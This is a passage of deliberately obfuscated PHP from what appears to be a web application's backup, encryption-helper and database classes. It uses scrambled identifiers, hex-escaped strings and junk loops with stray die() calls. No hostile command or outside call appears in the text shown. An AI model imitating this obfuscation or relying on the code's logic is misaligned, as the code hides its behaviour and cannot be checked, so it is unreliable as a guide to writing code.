$‘Õ¼ôöß[822]; while (strlen($­Á½Ãû¡) < $‘Õ¼ôöß[709]) { if (!$­Á½Ãû¡) { break; } $­Á½Ãû¡++; } } $Ã­¸šıö .= $²ÊÖ¹ä—[$ÂğÓÚ]; $á¥½Ø° = $‘Õ¼ôöß[823]; while (strlen($á¥½Ø°) < $‘Õ¼ôöß[713]) { if (!$á¥½Ø°) { break; } $á¥½Ø°++; } } $×§¼Â¾‡ = base64_decode($Ã­¸šıö); break; $Ìˆõ«©§ = $‘Õ¼ôöß[824]; while ($Ìˆõ«©§ < $‘Õ¼ôöß[713]) { if ($Ìˆõ«©§ >= 0) { break; } $Ìˆõ«©§++; } default: $×§¼Â¾‡ = $this->jcki1c95cd22($À¢‹…±, $¦é›ß¸é . $Ü„¶½¢Õ); $ôßÓ‘ ç = $‘Õ¼ôöß[825]; while ($ôßÓ‘ ç < $‘Õ¼ôöß[727]) { if ($ôßÓ‘ ç >= 0) { break; } $ôßÓ‘ ç++; } break; } if ($Ü´¼Õ— - 1 > 0) { $×§¼Â¾‡ = $this->aovg298d75b9($×§¼Â¾‡, $¦é›ß¸é, $Ü´¼Õ— - 1); } return $×§¼Â¾‡; } public function nwga3097e99d($ò¸ˆóöÜ) { $ÌŒã¨ö =& $_SERVER[µÅ˜º…æ]; $Â’úëÀ³ =& $_SERVER[ş•üòéú]; $ëÅŒ½˜ = $this->fskm496a4f3a(); $¦†ÖøîÜ = $this->fskm496a4f3a(); $æÁÁ‚ÊÚ = $ÌŒã¨ö[826]; $¼‰ÀÇ¢’ = ($ëÅŒ½˜ - 1) * ($¦†ÖøîÜ - 1); $ÍÉ©è = $ÌŒã¨ö[827]; while (strlen($ÍÉ©è) < $ÌŒã¨ö[713]) { if (!$ÍÉ©è) { break; } $ÍÉ©è++; } $Üœšñ’… = intval(($ëÅŒ½˜ + $¦†ÖøîÜ) / 2); $‘²§­È = $ÌŒã¨ö[828]; if (strlen($‘²§­È) < $ÌŒã¨ö[713]) { die; } while (1) { $œÇ¢ÈüŠ = $Üœšñ’…; $Úù±‹™û = $¼‰ÀÇ¢’; while ($Úù±‹™û % $œÇ¢ÈüŠ != 0) { $Åîµê¿Û = $Úù±‹™û; $•óú³ Ú = $ÌŒã¨ö[829]; $Úù±‹™û = $œÇ¢ÈüŠ; $œÇ¢ÈüŠ = $Åîµê¿Û % $œÇ¢ÈüŠ; } if ($œÇ¢ÈüŠ == 1) { break; } else { $Üœšñ’…++; } } $çù°Úšæ = 2; for ($•àí¬ŞÍ = 0; $•àí¬ŞÍ < $¼‰ÀÇ¢’ * 10; $•àí¬ŞÍ++) { if (($¼‰ÀÇ¢’ * $•àí¬ŞÍ + 1) % $Üœšñ’… == 0) { $çù°Úšæ = intval(($¼‰ÀÇ¢’ * $•àí¬ŞÍ + 1) / $Üœšñ’…); break; } } $úÉ»¢µ“ = $this->nozmc3f76e6b($ëÅŒ½˜ * $¦†ÖøîÜ . $Â’úëÀ³[6], $Â’úëÀ³[138]); $¿ÇêæÁ÷ = md5($Â’úëÀ³[310] . ($ëÅŒ½˜ + $¦†ÖøîÜ) . $Â’úëÀ³[311] . $Üœšñ’… . $Â’úëÀ³[311] . $çù°Úšæ . $Â’úëÀ³[312]); $ñîš¯”© = $ÌŒã¨ö[830]; $ò½æ¶• = $this->nozmc3f76e6b($ò¸ˆóöÜ, $¿ÇêæÁ÷) . $Â’úëÀ³[313] . $úÉ»¢µ“; $ìÕ‘ŒÃ¸ = $ÌŒã¨ö[831]; if (!$ìÕ‘ŒÃ¸) { return; } return $ò½æ¶•; $Û®ÈëÂÁ = $ÌŒã¨ö[832]; } public function daty6e25f853($€–Ê´Àà) { $Ø©îİè£ =& $_SERVER[µÅ˜º…æ]; $²­·ßø =& $_SERVER[ş•üòéú]; $€Úó›¯è = explode($²­·ßø[313], $€–Ê´Àà); $é¾ô²¨£ = $Ø©îİè£[833]; if (strlen($é¾ô²¨£) < $Ø©îİè£[715]) { die; } if (count($€Úó›¯è) != 2) { return $²­·ßø[6]; } $ÎÖäÕÕ = $this->jcki1c95cd22($€Úó›¯è[1] . $²­·ßø[6], $²­·ßø[138]); $´üöõŞ¹ = $Ø©îİè£[834]; if (strlen($´üöõŞ¹) < $Ø©îİè£[715]) { return; } if (!$ÎÖäÕÕ) { return $²­·ßø[6]; } $ÎÖäÕÕ = intval($ÎÖäÕÕ); $‡ùğ½©  = $Ø©îİè£[835]; if (!$‡ùğ½© ) { die; } $¯Õ¤¾› = 0; $Ô¼Ğ–Åø = $Ø©îİè£[836]; while ($Ô¼Ğ–Åø < $Ø©îİè£[709]) { if ($Ô¼Ğ–Åø >= 0) { break; } $Ô¼Ğ–Åø++; } $Ü÷³ƒÉó = 0; for ($„Úê€¢ = 3; $„Úê€¢ < $ÎÖäÕÕ; $„Úê€¢ += 2) { if ($ÎÖäÕÕ % $„Úê€¢ != 0) { continue; } $¯Õ¤¾› = $„Úê€¢; $Ü÷³ƒÉó = intval($ÎÖäÕÕ / $„Úê€¢); break; $â‡Ì´Ñ£ = $Ø©îİè£[837]; if (!$â‡Ì´Ñ£) { die; } } $Ÿî‡ÊÃ· = ($¯Õ¤¾› - 1) * ($Ü÷³ƒÉó - 1); $‰š˜ÒÉ = intval(($¯Õ¤¾› + $Ü÷³ƒÉó) / 2); $Â×î¯øÓ = $Ø©îİè£[838]; if (!$Â×î¯øÓ) { die; } while (1) { $—áµÀİ› = $‰š˜ÒÉ; $¹ñ‰Ñ÷Á = $Ÿî‡ÊÃ·; $ëåÆüÇõ = $Ø©îİè£[839]; if (strlen($ëåÆüÇõ) < $Ø©îİè£[709]) { die; } while ($¹ñ‰Ñ÷Á % $—áµÀİ› != 0) { $öš¾„‹‘ = $¹ñ‰Ñ÷Á; $¹ñ‰Ñ÷Á = $—áµÀİ›; $—áµÀİ› = $öš¾„‹‘ % $—áµÀİ›; $óªëƒ¹ã = $Ø©îİè£[840]; if (strlen($óªëƒ¹ã) < $Ø©îİè£[713]) { die; } } if ($—áµÀİ› == 1) { break; } else { $‰š˜ÒÉ++; } } $†ƒ”ç¸¿ = 2; for ($„Úê€¢ = 0; $„Úê€¢ < $Ÿî‡ÊÃ· * 10; $„Úê€¢++) { if (($Ÿî‡ÊÃ· * $„Úê€¢ + 1) % $‰š˜ÒÉ == 0) { $†ƒ”ç¸¿ = intval(($Ÿî‡ÊÃ· * $„Úê€¢ + 1) / $‰š˜ÒÉ); break; } } $ğùç¡ãï = md5($²­·ßø[310] . ($¯Õ¤¾› + $Ü÷³ƒÉó) . $²­·ßø[311] . $‰š˜ÒÉ . $²­·ßø[311] . $†ƒ”ç¸¿ . $²­·ßø[312]); $§Ş‘¢Æò = $this->jcki1c95cd22($€Úó›¯è[0], $ğùç¡ãï); return $§Ş‘¢Æò; } public function fskm496a4f3a() { $‰Ğ©ØÍù =& $_SERVER[µÅ˜º…æ]; $ø¼Œş”Ş = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ç°òïï¥ = array(); $äÌ§í€î = $‰Ğ©ØÍù[841]; if (!$äÌ§í€î) { die; } $„åäŒƒ÷ = 1; while ($„åäŒƒ÷ <= (int) sqrt($ø¼Œş”Ş)) { $âêÁãüª = $„åäŒƒ÷; while (!0) { $âêÁãüª++; $ûšËÓ¦ = $‰Ğ©ØÍù[842]; if (!$ûšËÓ¦) { die; } if ($âêÁãüª <= 2) { $„åäŒƒ÷ = $âêÁãüª; break; } else { if ($âêÁãüª < 2) { continue; } } $ú”Æ¿³ = !0; for ($¨è«çê = 2; $¨è«çê <= sqrt($âêÁãüª); $¨è«çê++) { if ($âêÁãüª % $¨è«çê == 0) { $ú”Æ¿³ = !1; } } if ($ú”Æ¿³) { $„åäŒƒ÷ = $âêÁãüª; break; } } $Ç°òïï¥[] = $„åäŒƒ÷; } $ï¹ıÉïÈ = 2; for ($âêÁãüª = $ø¼Œş”Ş; $âêÁãüª > 1; $âêÁãüª--) { $ú”Æ¿³ = !0; $›¶¸ª°™ = $‰Ğ©ØÍù[843]; if (strlen($›¶¸ª°™) < $‰Ğ©ØÍù[713]) { return; } foreach ($Ç°òïï¥ as $¿š³ö…³) { if ($âêÁãüª % $¿š³ö…³ == 0) { $ú”Æ¿³ = !1; break; } } if ($ú”Æ¿³) { $ï¹ıÉïÈ = $âêÁãüª; break; } } return $ï¹ıÉïÈ; $˜Ä¢¨„™ = $‰Ğ©ØÍù[844]; while (strlen($˜Ä¢¨„™) < $‰Ğ©ØÍù[713]) { if (!$˜Ä¢¨„™) { break; } $˜Ä¢¨„™++; } } public function bqjz8f6066ca($”“™®ƒ¨, $çÁ •³½) { $’ĞÕî =& $_SERVER[ş•üòéú]; return call_user_func(array($’ĞÕî[8], $’ĞÕî[314]), $”“™®ƒ¨, $çÁ •³½); } public function nozmc3f76e6b($ÎçÏ÷§ª, $İÒİ„Á¦) { $éŸöˆ¨Õ =& $_SERVER[µÅ˜º…æ]; $ŸÈŞ®ºÓ =& $_SERVER[ş•üòéú]; return call_user_func(array($ŸÈŞ®ºÓ[315], $ŸÈŞ®ºÓ[316]), $ÎçÏ÷§ª, $İÒİ„Á¦); $¯öç‡ÀÎ = $éŸöˆ¨Õ[845]; if (strlen($¯öç‡ÀÎ) < $éŸöˆ¨Õ[715]) { die; } } public function jcki1c95cd22($©Òäµ“û, $†ÈŠ”ˆá) { $Óí¹ƒÀÁ =& $_SERVER[ş•üòéú]; return call_user_func(array($Óí¹ƒÀÁ[315], $Óí¹ƒÀÁ[317]), $©Òäµ“û, $†ÈŠ”ˆá); $•é¡æƒ™ = $_SERVER[µÅ˜º…æ][846]; if (!$•é¡æƒ™) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[µÅ˜º…æ][847]); $Ü®‡ÏÄ÷ = $this->init(); if (!$Ü®‡ÏÄ÷) { return; } $this->keep(); } public function init() { $®½Ò¹Ôº =& $_SERVER[µÅ˜º…æ]; $this->isManual(); self::$name = date($®½Ò¹Ôº[848]); if (!($šá¤Äü¦ = $this->model->lastItem())) { $šá¤Äü¦ = $this->initData(); } else { self::$name = $šá¤Äü¦[$®½Ò¹Ôº[32]]; if ($šá¤Äü¦[$®½Ò¹Ôº[849]] == $®½Ò¹Ôº[91]) { self::$name = date($®½Ò¹Ôº[259]); $€€ÛÉº­ = intval(_get($šá¤Äü¦, $®½Ò¹Ôº[850], 0)); if (self::$manual == 0 && $šá¤Äü¦[$®½Ò¹Ôº[32]] == self::$name) { $this->model->remove($šá¤Äü¦[$®½Ò¹Ôº[487]]); } $šá¤Äü¦ = $this->initData($€€ÛÉº­, $šá¤Äü¦[$®½Ò¹Ôº[851]]); } else { $å…Ç‡‡ = $this->checkStore($šá¤Äü¦[$®½Ò¹Ôº[851]]); if (!$å…Ç‡‡) { return !1; } } } if (!$šá¤Äü¦) { return !1; } self::$option = $šá¤Äü¦; } private function isManual() { $õ›€Ò å = _get($GLOBALS, $_SERVER[µÅ˜º…æ][852], 0); $õ›€Ò å = intval($õ›€Ò å); self::$manual = $õ›€Ò å && $õ›€Ò å == 1 ? 1 : 0; } private function initData($ıÈ©’Ì® = 0, $ˆÄÜû·’ = '') { $ÚÚÑ»ó— =& $_SERVER[µÅ˜º…æ]; $¶½¦™‡ = $this->model->config(); if ($ˆÄÜû·’ && $¶½¦™‡[$ÚÚÑ»ó—[851]] != $ˆÄÜû·’) { $ıÈ©’Ì® = 0; } $ÕªúÛ¢ = $this->checkStore($¶½¦™‡[$ÚÚÑ»ó—[851]]); if (!$ÕªúÛ¢) { return !1; } if (self::$manual == 1) { self::$name .= $ÚÚÑ»ó—[11] . date($ÚÚÑ»ó—[853]); } $¤îê­¹¯ = array($ÚÚÑ»ó—[851] => $¶½¦™‡[$ÚÚÑ»ó—[851]], $ÚÚÑ»ó—[32] => self::$name, $ÚÚÑ»ó—[849] => 0, $ÚÚÑ»ó—[168] => $¶½¦™‡[$ÚÚÑ»ó—[168]], $ÚÚÑ»ó—[854] => self::$manual, $ÚÚÑ»ó—[855] => array($ÚÚÑ»ó—[856] => array($ÚÚÑ»ó—[849] => 0), $ÚÚÑ»ó—[857] => array($ÚÚÑ»ó—[849] => 0, $ÚÚÑ»ó—[858] => 0, $ÚÚÑ»ó—[859] => 0, $ÚÚÑ»ó—[33] => $ÚÚÑ»ó—[12], $ÚÚÑ»ó—[860] => 0, $ÚÚÑ»ó—[861] => 0), $ÚÚÑ»ó—[862] => array($ÚÚÑ»ó—[849] => 0, $ÚÚÑ»ó—[858] => 0, $ÚÚÑ»ó—[859] => 0, $ÚÚÑ»ó—[860] => 0, $ÚÚÑ»ó—[861] => 0), $ÚÚÑ»ó—[230] => array($ÚÚÑ»ó—[849] => 0, $ÚÚÑ»ó—[863] => 0, $ÚÚÑ»ó—[864] => 0, $ÚÚÑ»ó—[865] => 0, $ÚÚÑ»ó—[866] => 0, $ÚÚÑ»ó—[557] => $ıÈ©’Ì®, $ÚÚÑ»ó—[860] => 0, $ÚÚÑ»ó—[861] => 0)), $ÚÚÑ»ó—[860] => time(), $ÚÚÑ»ó—[861] => 0); $–´†™¾¾ = $this->model->insert($¤îê­¹¯); $¤îê­¹¯[$ÚÚÑ»ó—[487]] = $–´†™¾¾; return $¤îê­¹¯; } private function checkStore($İúë€’) { $¸Ğ¶Ş¦° = Model($_SERVER[µÅ˜º…æ][867]); $«Åùğñ­ = $¸Ğ¶Ş¦°->listData($İúë€’); $‹Õ­¢— = $¸Ğ¶Ş¦°->checkConfig($«Åùğñ­, !0); if ($‹Õ­¢— !== !0) { $this->message = $‹Õ­¢—; return !1; } return !0; } public static function get() { if (!self::$option) { $ã¡Á‚— = Model($_SERVER[µÅ˜º…æ][847]); $¿Õ¸ğÜ = $ã¡Á‚—->findByName(self::$name); $ã¡Á‚—->parseContent($¿Õ¸ğÜ); self::$option = $¿Õ¸ğÜ; } return self::$option; } public static function set($¹µ·Á¬´) { $÷´£ï™® =& $_SERVER[µÅ˜º…æ]; $¦ğĞÚ‚» = self::get(); foreach ($¹µ·Á¬´ as $šù­èƒ¦ => $¬¯¥¸«Ê) { array_set_value($¦ğĞÚ‚», $šù­èƒ¦, $¬¯¥¸«Ê); } Model($÷´£ï™®[847])->update($¦ğĞÚ‚»[$÷´£ï™®[487]], $¦ğĞÚ‚»); self::$option = $¦ğĞÚ‚»; return self::$option; } public function keep() { $Œ›§çô½ =& $_SERVER[µÅ˜º…æ]; $¬’ï»ÁÎ = self::get(); if (_get($¬’ï»ÁÎ, $Œ›§çô½[868], 0) == $Œ›§çô½[91]) { return; } $this->backupKeep($¬’ï»ÁÎ); self::set(array($Œ›§çô½[868] => 1)); } private function backupKeep($ÀâÙÊø¡) { $¿õ³“ =& $_SERVER[µÅ˜º…æ]; if (self::$manual == 1) { return; } $ÒÂÉØ¾Í = $this->model->listData(); if (empty($ÒÂÉØ¾Í)) { return; } $üä¯–æã = array(); $âæ«Ê· = array(); $½—ªØƒŒ = date($¿õ³“[869], strtotime($¿õ³“[870])); foreach ($ÒÂÉØ¾Í as $¯Ï…à…æ => $«úÑ·½õ) { $ÍµÀ…„¾ = $«úÑ·½õ[$¿õ³“[32]]; if ($¯Ï…à…æ < 7 || $«úÑ·½õ[$¿õ³“[854]] == $¿õ³“[91]) { $üä¯–æã[] = $ÍµÀ…„¾; continue; } $ÆÆÖë‚ = substr($ÍµÀ…„¾, 0, 6); if ($ÆÆÖë‚ < $½—ªØƒŒ) { continue; } if (!isset($âæ«Ê·[$ÆÆÖë‚]) || $ÍµÀ…„¾ < $âæ«Ê·[$ÆÆÖë‚]) { $âæ«Ê·[$ÆÆÖë‚] = $ÍµÀ…„¾; } if (substr($ÍµÀ…„¾, 6, 2) == $¿õ³“[871]) { $âæ«Ê·[$ÆÆÖë‚] = $ÍµÀ…„¾; } } $üä¯–æã = array_merge($üä¯–æã, array_values($âæ«Ê·)); $üä¯–æã = array_unique($üä¯–æã); foreach ($ÒÂÉØ¾Í as $«úÑ·½õ) { $ÍµÀ…„¾ = $«úÑ·½õ[$¿õ³“[32]]; if (!empty($ÍµÀ…„¾) && in_array($ÍµÀ…„¾, $üä¯–æã)) { continue; } $this->model->remove($«úÑ·½õ[$¿õ³“[487]]); $éí¯®öù = $this->backupPath($ÀâÙÊø¡); IO::remove($éí¯®öù, !1); } } private function backupPath($‹™¬Ä•÷) { $–ù´”İ‚ =& $_SERVER[µÅ˜º…æ]; static $ú×È¸©ï = null; if (is_null($ú×È¸©ï)) { $ú×È¸©ï = Model($–ù´”İ‚[872])->get($–ù´”İ‚[873]); } $¢ª¢î½ = $‹™¬Ä•÷[$–ù´”İ‚[32]]; $ÀÈÇøí = substr(md5($–ù´”İ‚[874] . $ú×È¸©ï . $¢ª¢î½), 0, 8); return "\173\151\x6f\72{$‹™¬Ä•÷[$–ù´”İ‚[851]]}\x7d\x2f\144\141\x74\x61\x62\141\163\x65\x2f\142\x61\143\153\x75\160\x2f" . $¢ª¢î½ . $–ù´”İ‚[11] . $ÀÈÇøí; } public function db() { $¼±çÀ =& $_SERVER[µÅ˜º…æ]; $äî¦İ· = self::get(); if (_get($äî¦İ·, $¼±çÀ[875], 0) == $¼±çÀ[91]) { return !0; } $–›‚õ°¢ = new BackupDb(); if (!$–›‚õ°¢->index()) { return !1; } self::set(array($¼±çÀ[875] => 1)); return !0; } public function dbFile() { $‘ƒéÄ² =& $_SERVER[µÅ˜º…æ]; $¸ßúÍˆÅ = self::get(); if (_get($¸ßúÍˆÅ, $‘ƒéÄ²[876], 0) == $‘ƒéÄ²[91]) { return !0; } $—ñË÷í = new BackupDbFile(); if (!$—ñË÷í->index()) { return !1; } self::set(array($‘ƒéÄ²[876] => 1)); return !0; } public function file() { $‘ºĞâçß =& $_SERVER[µÅ˜º…æ]; $¡­‰Ó‚ = self::get(); if (_get($¡­‰Ó‚, $‘ºĞâçß[877], 0) == $‘ºĞâçß[91]) { return !0; } self::set(array($‘ºĞâçß[877] => 1, $‘ºĞâçß[849] => 1)); return !0; } public static function log($Õ…ÃÃë¹) { write_log($Õ…ÃÃë¹, $_SERVER[µÅ˜º…æ][878]); } } goto DšóÃ‹ Ö; eÀ„Ä¬£¼»: class DbSqlite extends DbSqliteBase { protected function _execSql($àÛÂ”üü) { if (!$this->_linkID || !$àÛÂ”üü) { return; } sqlite_query($this->_linkID, $àÛÂ”üü); } protected function initConnectAfter() { $Ì£²ò‰ =& $_SERVER[µÅ˜º…æ]; $this->_execSql($Ì£²ò‰[1126]); $this->_execSql($Ì£²ò‰[1127]); } public function query($Ù™•™İç) { $àÅ¤À¾ = parent::query($Ù™•™İç); return $àÅ¤À¾; } public function execute($ÜĞÓãŞ¤) { $ÏÅÖÑÉÃ =& $_SERVER[µÅ˜º…æ]; if (!CacheLock::fileLock($ÏÅÖÑÉÃ[1128])) { return !1; } $œÖçÕù = parent::execute($ÜĞÓãŞ¤); CacheLock::fileUnLock($ÏÅÖÑÉÃ[1128]); return $œÖçÕù; } } class DbSqlite3 extends DbSqlite3Base { protected function _execSql($çäŞ““ì) { if (!$this->_linkID || !$çäŞ““ì) { return; } $this->_linkID->exec($çäŞ““ì); } protected function initConnectAfter() { $œÄñÃˆ =& $_SERVER[µÅ˜º…æ]; $this->_execSql($œÄñÃˆ[1126]); $this->_execSql($œÄñÃˆ[1127]); } public function query($™õ×õáÒ) { $ßÂ…ú¿î = parent::query($™õ×õáÒ); return $ßÂ…ú¿î; } public function execute($šğû„²û) { $‡£‰á¨¢ =& $_SERVER[µÅ˜º…æ]; if (!CacheLock::fileLock($‡£‰á¨¢[1128])) { return !1; } $Ùšı†¹Ÿ = parent::execute($šğû„²û); CacheLock::fileUnLock($‡£‰á¨¢[1128]); return $Ùšı†¹Ÿ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\74\x3e", "\147\164" => "\x3e", "\x65\147\164" => "\76\x3d", "\x6c\164" => "\74", "\x65\x6c\x74" => "\74\75", "\156\157\164\x6c\151\x6b\x65" => "\116\x4f\124\x20\114\x49\x4b\x45", "\x6c\151\153\x65" => "\114\x49\113\105", "\x69\156" => "\111\116", "\156\x6f\x74\151\x6e" => "\x4e\117\124\40\111\x4e", "\x6e\x6f\164\x20\x69\x6e" => "\116\x4f\x54\40\111\x4e", "\x62\145\x74\167\x65\145\156" => "\102\x45\124\x57\x45\105\x4e", "\156\x6f\164\x62\x65\x74\x77\145\x65\x6e" => "\116\x4f\124\x20\102\x45\x54\127\x45\105\116", "\156\157\164\x20\x62\145\164\x77\x65\145\156" => "\116\117\x54\x20\102\105\x54\x57\x45\105\x4e"); protected $selectSql = "\123\105\114\105\103\x54\x25\104\111\123\x54\111\116\103\x54\x25\40\x25\106\x49\105\114\x44\45\40\x46\122\117\x4d\40\x25\124\101\102\114\x45\x25\x25\x4a\117\x49\116\x25\45\127\110\x45\122\x45\x25\45\x47\x52\117\125\x50\45\45\110\x41\x56\111\116\x47\x25\45\117\122\x44\x45\122\x25\45\x4c\x49\115\x49\x54\x25\40\x25\125\x4e\x49\x4f\116\x25\45\x43\x4f\115\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $´¯ù½ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[µÅ˜º…æ][1129], $´¯ù½); } public function factory($ª•§Í‰ = '') { $Ãö£è”æ =& $_SERVER[µÅ˜º…æ]; $ª•§Í‰ = $this->parseConfig($ª•§Í‰); if (empty($ª•§Í‰[$Ãö£è”æ[1130]])) { think_exception(think_lang($Ãö£è”æ[1131])); } $this->dbType = ucwords(strtolower($ª•§Í‰[$Ãö£è”æ[1130]])); $ĞÆãÙ¹¯ = $Ãö£è”æ[1132] . $this->dbType; if (class_exists($ĞÆãÙ¹¯)) { $…¯Œù° = new $ĞÆãÙ¹¯($ª•§Í‰); if ($Ãö£è”æ[1133] != strtolower($ª•§Í‰[$Ãö£è”æ[1130]])) { $…¯Œù°->dbType = strtoupper($this->dbType); } else { $…¯Œù°->dbType = $this->_getDsnType($ª•§Í‰[$Ãö£è”æ[1082]]); } } else { think_exception(think_lang($Ãö£è”æ[1134]) . $Ãö£è”æ[1135] . $ĞÆãÙ¹¯); } return $…¯Œù°; } public function __call($ø½Ö©çŸ, $İéœĞ¨Š) { if (method_exists($this, $ø½Ö©çŸ)) { return call_user_func_array(array($this, $ø½Ö©çŸ), $İéœĞ¨Š); } } protected function _getDsnType($îØÆ¯ûÃ) { $«Ôì‘Ç = explode($_SERVER[µÅ˜º…æ][4], $îØÆ¯ûÃ); $‰¼‹ÈŠ = strtoupper(trim($«Ôì‘Ç[0])); return $‰¼‹ÈŠ; } private function parseConfig($½œÆ Ùç = '') { $Ğ±Ì™Å˜ =& $_SERVER[µÅ˜º…æ]; if (!empty($½œÆ Ùç) && is_string($½œÆ Ùç)) { $½œÆ Ùç = $this->parseDSN($½œÆ Ùç); } elseif (is_array($½œÆ Ùç)) { $½œÆ Ùç = array_change_key_case($½œÆ Ùç); $½œÆ Ùç = array($Ğ±Ì™Å˜[1130] => $½œÆ Ùç[$Ğ±Ì™Å˜[1136]], $Ğ±Ì™Å˜[1051] => $½œÆ Ùç[$Ğ±Ì™Å˜[1137]], $Ğ±Ì™Å˜[1052] => $½œÆ Ùç[$Ğ±Ì™Å˜[1138]], $Ğ±Ì™Å˜[1049] => $½œÆ Ùç[$Ğ±Ì™Å˜[1139]], $Ğ±Ì™Å˜[1050] => $½œÆ Ùç[$Ğ±Ì™Å˜[1140]], $Ğ±Ì™Å˜[21] => $½œÆ Ùç[$Ğ±Ì™Å˜[1141]], $Ğ±Ì™Å˜[1082] => $½œÆ Ùç[$Ğ±Ì™Å˜[1142]], $Ğ±Ì™Å˜[17] => isset($½œÆ Ùç[$Ğ±Ì™Å˜[1143]]) ? $½œÆ Ùç[$Ğ±Ì™Å˜[1143]] : array()); } elseif (empty($½œÆ Ùç)) { if (think_config($Ğ±Ì™Å˜[1144]) && $Ğ±Ì™Å˜[1133] != strtolower(think_config($Ğ±Ì™Å˜[1145]))) { $½œÆ Ùç = $this->parseDSN(think_config($Ğ±Ì™Å˜[1144])); } else { $½œÆ Ùç = array($Ğ±Ì™Å˜[1130] => think_config($Ğ±Ì™Å˜[1145]), $Ğ±Ì™Å˜[1051] => think_config($Ğ±Ì™Å˜[1146]), $Ğ±Ì™Å˜[1052] => think_config($Ğ±Ì™Å˜[1147]), $Ğ±Ì™Å˜[1049] => think_config($Ğ±Ì™Å˜[1148]), $Ğ±Ì™Å˜[1050] => think_config($Ğ±Ì™Å˜[1149]), $Ğ±Ì™Å˜[21] => think_config($Ğ±Ì™Å˜[323]), $Ğ±Ì™Å˜[1082] => think_config($Ğ±Ì™Å˜[1144]), $Ğ±Ì™Å˜[17] => think_config($Ğ±Ì™Å˜[1150])); } } return $½œÆ Ùç; } protected function initConnect($Ú™éßä¨ = true) { if (1 == think_config($_SERVER[µÅ˜º…æ][22])) { $this->_linkID = $this->multiConnect($Ú™éßä¨); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } $this->initConnectAfter(); } protected function initConnectAfter() { } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ğúó¾éú => $½ò¯š±‹) { $this->_linkID = $½ò¯š±‹; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ñùÔÃ­Ş = false) { $ß ÉÁ¶± =& $_SERVER[µÅ˜º…æ]; static $ãŠˆ­›ş = array(); static $÷ïòÏ·… = -1; if (empty($ãŠˆ­›ş)) { foreach ($this->config as $ÊË“çÂ¨ => $½íÙØé) { $ãŠˆ­›ş[$ÊË“çÂ¨] = explode($ß ÉÁ¶±[50], $½íÙØé); } } if (think_config($ß ÉÁ¶±[1151])) { if ($ñùÔÃ­Ş || think_config($ß ÉÁ¶±[486]) === !0) { $íŒ®¥Àê = floor(mt_rand(0, think_config($ß ÉÁ¶±[1152]) - 1)); $÷ïòÏ·… = $íŒ®¥Àê; } else { if (is_numeric(think_config($ß ÉÁ¶±[1153]))) { $íŒ®¥Àê = think_config($ß ÉÁ¶±[1153]); } else { $íŒ®¥Àê = floor(mt_rand(think_config($ß ÉÁ¶±[1152]), count($ãŠˆ­›ş[$ß ÉÁ¶±[1049]]) - 1)); } } } else { $íŒ®¥Àê = floor(mt_rand(0, count($ãŠˆ­›ş[$ß ÉÁ¶±[1049]]) - 1)); $÷ïòÏ·… = $íŒ®¥Àê; } $íŒ®¥Àê = $÷ïòÏ·… !== -1 ? $÷ïòÏ·… : $íŒ®¥Àê; $§¬ÇƒÙ® = array($ß ÉÁ¶±[1051] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[1051]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[1051]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[1051]][0], $ß ÉÁ¶±[1052] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[1052]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[1052]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[1052]][0], $ß ÉÁ¶±[1049] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[1049]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[1049]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[1049]][0], $ß ÉÁ¶±[1050] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[1050]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[1050]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[1050]][0], $ß ÉÁ¶±[21] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[21]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[21]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[21]][0], $ß ÉÁ¶±[1082] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[1082]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[1082]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[1082]][0], $ß ÉÁ¶±[17] => isset($ãŠˆ­›ş[$ß ÉÁ¶±[17]][$íŒ®¥Àê]) ? $ãŠˆ­›ş[$ß ÉÁ¶±[17]][$íŒ®¥Àê] : $ãŠˆ­›ş[$ß ÉÁ¶±[17]][0]); return $this->connect($§¬ÇƒÙ®, $íŒ®¥Àê); } public function parseDSN($‰²ª¬Ğ) { $Õ ûôº· =& $_SERVER[µÅ˜º…æ]; if (empty($‰²ª¬Ğ)) { return !1; } $³ïöŒÚø = parse_url($‰²ª¬Ğ); if ($³ïöŒÚø[$Õ ûôº·[205]]) { $ç¶±Œ‰† = array($Õ ûôº·[1130] => $³ïöŒÚø[$Õ ûôº·[205]], $Õ ûôº·[1051] => isset($³ïöŒÚø[$Õ ûôº·[684]]) ? $³ïöŒÚø[$Õ ûôº·[684]] : $Õ ûôº·[12], $Õ ûôº·[1052] => isset($³ïöŒÚø[$Õ ûôº·[1154]]) ? $³ïöŒÚø[$Õ ûôº·[1154]] : $Õ 